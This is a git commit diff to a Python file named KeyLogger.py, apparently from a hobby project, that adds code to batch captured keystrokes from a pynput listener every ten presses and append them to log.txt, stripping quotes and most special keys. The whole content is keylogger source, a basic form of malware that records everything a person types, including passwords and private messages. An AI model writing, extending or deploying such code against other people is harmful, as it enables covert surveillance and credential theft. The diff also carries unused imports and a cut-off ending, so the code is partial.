0b45a8cb83a950e8338df00d182102f2c4a7a19f
TimmtyN <nguyentimot@gmail.com>
2024-11-12 05:19:31 -0500

    Keys will be logged in a text file.

--- KeyLogger.py
+++ KeyLogger.py
@@ -1,12 +1,14 @@
+from curses import has_key
+from os.path import isabs
 from warnings import onceregistry
 
 import pynput
 
 from pynput.keyboard import Key, Listener
 
-# Auto saver
+# Count works as an Auto Saver
 count = 0
-key = []
+keys = []
 
 def on_press(key):
     global keys, count
@@ -15,13 +17,23 @@ def on_press(key):
     count += 1
     print("{0} pressed".format(key))
 
-    #if count >=
-e
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
 # Storing the logged keys in a file
 def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
-            f.write(key)
+            # Altering text file
+            k = str(key).replace("'", "")
+            # If we find [spacebar] we replace
+            if k.find("space") > 0:
+                f.write('[]')
+            # If key doesn't exist write it
+            elif k.find("Key") == -1:
+                f.write(k)
 
 
 def on_release(key):
